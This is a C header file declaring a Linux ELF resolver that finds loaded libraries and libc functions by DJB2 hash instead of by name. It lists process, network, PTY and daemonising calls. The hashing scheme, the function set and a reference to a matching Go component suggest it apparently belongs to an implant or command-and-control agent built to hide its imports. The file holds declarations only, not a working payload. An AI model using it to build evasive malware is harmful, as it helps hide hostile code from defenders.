#ifndef ELF_RESOLVE_H
#define ELF_RESOLVE_H

#include <stdint.h>
#include <stddef.h>

/// ELF hash-based API resolution for Linux
/// Parses /proc/self/maps → walks ELF .dynsym/.dynstr → DJB2 hash matching
///
/// Two modes:
///   1. Static ELF (BUILD_SO not defined): stubs — all ops use direct syscalls
///   2. Shared Object (BUILD_SO defined): full resolver — libc is loaded by ld.so

#ifndef DJB2_SEED
#define DJB2_SEED 0x1505U
#endif

/// DJB2 hash — case-insensitive, seeded. Matches Go-side djb2Hash() exactly.
uint32_t djb2_hash(uint32_t seed, const char *s);

/// Resolve a loaded shared library by DJB2 hash of its basename.
/// Scans /proc/self/maps for r-xp mappings, hashes each library name.
/// Returns the base address (lowest mapping) or NULL.
void *elf_resolve_lib(uint32_t name_hash);

/// Resolve a symbol within an ELF library by DJB2 hash.
/// Parses ELF header → PT_DYNAMIC → DT_SYMTAB + DT_STRTAB + DT_GNU_HASH
/// Returns the symbol's absolute address or NULL.
void *elf_resolve_sym(void *lib_base, uint32_t symbol_hash);

/// Initialize the resolver — resolves all APIs into g_apis.
/// Call once at startup. Returns 0 on success, -1 on failure.
int elf_resolver_init(void);

/// Resolved API table — function pointers populated by elf_resolver_init()
typedef struct {
    // ── File I/O ──
    void *fn_open;
    void *fn_close;
    void *fn_read;
    void *fn_write;
    void *fn_stat;
    void *fn_fstat;
    void *fn_unlink;
    void *fn_rename;
    void *fn_mkdir;
    void *fn_opendir;
    void *fn_readdir;
    void *fn_closedir;
    void *fn_getcwd;
    void *fn_chdir;
    void *fn_rmdir;
    void *fn_rewinddir;

    // ── Memory ──
    void *fn_mmap;
    void *fn_munmap;
    void *fn_mprotect;

    // ── Process ──
    void *fn_fork;
    void *fn_execve;
    void *fn_execvp;
    void *fn_waitpid;
    void *fn_getpid;
    void *fn_getuid;
    void *fn_geteuid;
    void *fn_kill;
    void *fn_setsid;
    void *fn_setpgid;
    void *fn_exit;
    void *fn_prctl;

    // ── Network ──
    void *fn_socket;
    void *fn_connect;
    void *fn_getaddrinfo;
    void *fn_freeaddrinfo;
    void *fn_gethostname;
    void *fn_setsockopt;
    void *fn_getsockopt;
    void *fn_select;
    void *fn_send;
    void *fn_recv;
    void *fn_bind;
    void *fn_listen;
    void *fn_accept;

    // ── Threading ──
    void *fn_pthread_create;
    void *fn_pthread_detach;
    void *fn_pthread_mutex_init;
    void *fn_pthread_mutex_lock;
    void *fn_pthread_mutex_unlock;

    // ── Pipes & PTY ──
    void *fn_pipe;
    void *fn_dup2;
    void *fn_fcntl;
    void *fn_posix_openpt;
    void *fn_grantpt;
    void *fn_unlockpt;
    void *fn_ptsname;
    void *fn_ioctl;

    // ── System ──
    void *fn_getenv;
    void *fn_setenv;
    void *fn_sleep;
    void *fn_usleep;
    void *fn_snprintf;
    void *fn_strtol;

    // ── User/Group ──
    void *fn_getpwuid;
    void *fn_getgrgid;
    void *fn_getifaddrs;
    void *fn_freeifaddrs;
    void *fn_inet_ntop;
    void *fn_localtime;
    void *fn_strftime;

    // ── Dynamic ──
    void *fn_dlopen;
    void *fn_dlsym;
    void *fn_dlclose;
} resolved_apis_t;

extern resolved_apis_t g_apis;

// ── Convenience casting macros ──
// Type-safe access to resolved APIs. Use ONLY when the resolver has populated g_apis
// (i.e. BUILD_SO mode). In static mode, use sys_*() direct syscalls instead.

#define R_open(p,f,m)           ((int(*)(const char*,int,...))g_apis.fn_open)(p,f,m)
#define R_close(fd)             ((int(*)(int))g_apis.fn_close)(fd)
#define R_read(fd,b,n)          ((long(*)(int,void*,unsigned long))g_apis.fn_read)(fd,b,n)
#define R_write(fd,b,n)         ((long(*)(int,const void*,unsigned long))g_apis.fn_write)(fd,b,n)
#define R_stat(p,s)             ((int(*)(const char*,void*))g_apis.fn_stat)(p,s)
#define R_fstat(fd,s)           ((int(*)(int,void*))g_apis.fn_fstat)(fd,s)
#define R_unlink(p)             ((int(*)(const char*))g_apis.fn_unlink)(p)
#define R_rename(o,n)           ((int(*)(const char*,const char*))g_apis.fn_rename)(o,n)
#define R_mkdir(p,m)            ((int(*)(const char*,unsigned int))g_apis.fn_mkdir)(p,m)
#define R_opendir(p)            ((void*(*)(const char*))g_apis.fn_opendir)(p)
#define R_readdir(d)            ((void*(*)(void*))g_apis.fn_readdir)(d)
#define R_closedir(d)           ((int(*)(void*))g_apis.fn_closedir)(d)
#define R_getcwd(b,s)           ((char*(*)(char*,unsigned long))g_apis.fn_getcwd)(b,s)
#define R_chdir(p)              ((int(*)(const char*))g_apis.fn_chdir)(p)
#define R_rmdir(p)              ((int(*)(const char*))g_apis.fn_rmdir)(p)
#define R_rewinddir(d)          ((void(*)(void*))g_apis.fn_rewinddir)(d)

#define R_fork()                ((int(*)(void))g_apis.fn_fork)()
#define R_execve(p,a,e)         ((int(*)(const char*,char*const*,char*const*))g_apis.fn_execve)(p,a,e)
#define R_execvp(f,a)           ((int(*)(const char*,char*const*))g_apis.fn_execvp)(f,a)
#define R_waitpid(p,s,o)        ((int(*)(int,int*,int))g_apis.fn_waitpid)(p,s,o)
#define R_getpid()              ((int(*)(void))g_apis.fn_getpid)()
#define R_getuid()              ((unsigned int(*)(void))g_apis.fn_getuid)()
#define R_geteuid()             ((unsigned int(*)(void))g_apis.fn_geteuid)()
#define R_kill(p,s)             ((int(*)(int,int))g_apis.fn_kill)(p,s)
#define R_setsid()              ((int(*)(void))g_apis.fn_setsid)()
#define R_setpgid(p,g)          ((int(*)(int,int))g_apis.fn_setpgid)(p,g)
#define R_exit(s)               ((void(*)(int))g_apis.fn_exit)(s)
#define R_prctl(o,a2,a3,a4,a5)  ((int(*)(int,unsigned long,unsigned long,unsigned long,unsigned long))g_apis.fn_prctl)(o,a2,a3,a4,a5)

#define R_socket(d,t,p)         ((int(*)(int,int,int))g_apis.fn_socket)(d,t,p)
#define R_connect(s,a,l)        ((int(*)(int,const void*,unsigned int))g_apis.fn_connect)(s,a,l)
#define R_getaddrinfo(h,s,hi,r) ((int(*)(const char*,const char*,const void*,void**))g_apis.fn_getaddrinfo)(h,s,hi,r)
#define R_freeaddrinfo(r)       ((void(*)(void*))g_apis.fn_freeaddrinfo)(r)
#define R_gethostname(b,l)      ((int(*)(char*,unsigned long))g_apis.fn_gethostname)(b,l)
#define R_setsockopt(s,l,o,v,n) ((int(*)(int,int,int,const void*,unsigned int))g_apis.fn_setsockopt)(s,l,o,v,n)
#define R_getsockopt(s,l,o,v,n) ((int(*)(int,int,int,void*,unsigned int*))g_apis.fn_getsockopt)(s,l,o,v,n)
#define R_select(n,r,w,e,t)     ((int(*)(int,void*,void*,void*,void*))g_apis.fn_select)(n,r,w,e,t)
#define R_send(s,b,l,f)         ((long(*)(int,const void*,unsigned long,int))g_apis.fn_send)(s,b,l,f)
#define R_recv(s,b,l,f)         ((long(*)(int,void*,unsigned long,int))g_apis.fn_recv)(s,b,l,f)
#define R_bind(s,a,l)           ((int(*)(int,const void*,unsigned int))g_apis.fn_bind)(s,a,l)
#define R_listen(s,b)           ((int(*)(int,int))g_apis.fn_listen)(s,b)
#define R_accept(s,a,l)         ((int(*)(int,void*,unsigned int*))g_apis.fn_accept)(s,a,l)

#define R_pthread_create(t,a,f,d)  ((int(*)(void*,const void*,void*(*)(void*),void*))g_apis.fn_pthread_create)(t,a,f,d)
#define R_pthread_detach(t)        ((int(*)(unsigned long))g_apis.fn_pthread_detach)(t)
#define R_pthread_mutex_init(m,a)  ((int(*)(void*,const void*))g_apis.fn_pthread_mutex_init)(m,a)
#define R_pthread_mutex_lock(m)    ((int(*)(void*))g_apis.fn_pthread_mutex_lock)(m)
#define R_pthread_mutex_unlock(m)  ((int(*)(void*))g_apis.fn_pthread_mutex_unlock)(m)

#define R_pipe(p)               ((int(*)(int*))g_apis.fn_pipe)(p)
#define R_dup2(o,n)             ((int(*)(int,int))g_apis.fn_dup2)(o,n)
#define R_fcntl(fd,cmd,...)     ((int(*)(int,int,...))g_apis.fn_fcntl)(fd,cmd,##__VA_ARGS__)
#define R_posix_openpt(f)       ((int(*)(int))g_apis.fn_posix_openpt)(f)
#define R_grantpt(fd)           ((int(*)(int))g_apis.fn_grantpt)(fd)
#define R_unlockpt(fd)          ((int(*)(int))g_apis.fn_unlockpt)(fd)
#define R_ptsname(fd)           ((char*(*)(int))g_apis.fn_ptsname)(fd)
#define R_ioctl(fd,r,...)       ((int(*)(int,unsigned long,...))g_apis.fn_ioctl)(fd,r,##__VA_ARGS__)

#define R_getenv(k)             ((char*(*)(const char*))g_apis.fn_getenv)(k)
#define R_setenv(k,v,o)         ((int(*)(const char*,const char*,int))g_apis.fn_setenv)(k,v,o)
#define R_sleep(s)              ((unsigned int(*)(unsigned int))g_apis.fn_sleep)(s)
#define R_usleep(u)             ((int(*)(unsigned int))g_apis.fn_usleep)(u)
#define R_snprintf(b,n,f,...)   ((int(*)(char*,unsigned long,const char*,...))g_apis.fn_snprintf)(b,n,f,##__VA_ARGS__)
#define R_strtol(s,e,b)         ((long(*)(const char*,char**,int))g_apis.fn_strtol)(s,e,b)

#define R_getpwuid(u)           ((void*(*)(unsigned int))g_apis.fn_getpwuid)(u)
#define R_getgrgid(g)           ((void*(*)(unsigned int))g_apis.fn_getgrgid)(g)
#define R_getifaddrs(a)         ((int(*)(void**))g_apis.fn_getifaddrs)(a)
#define R_freeifaddrs(a)        ((void(*)(void*))g_apis.fn_freeifaddrs)(a)
#define R_inet_ntop(f,s,d,l)    ((const char*(*)(int,const void*,char*,unsigned int))g_apis.fn_inet_ntop)(f,s,d,l)
#define R_localtime(t)          ((void*(*)(const void*))g_apis.fn_localtime)(t)
#define R_strftime(b,m,f,t)     ((unsigned long(*)(char*,unsigned long,const char*,const void*))g_apis.fn_strftime)(b,m,f,t)

#define R_dlopen(f,m)           ((void*(*)(const char*,int))g_apis.fn_dlopen)(f,m)
#define R_dlsym(h,s)            ((void*(*)(void*,const char*))g_apis.fn_dlsym)(h,s)
#define R_dlclose(h)            ((int(*)(void*))g_apis.fn_dlclose)(h)

#endif /* ELF_RESOLVE_H */
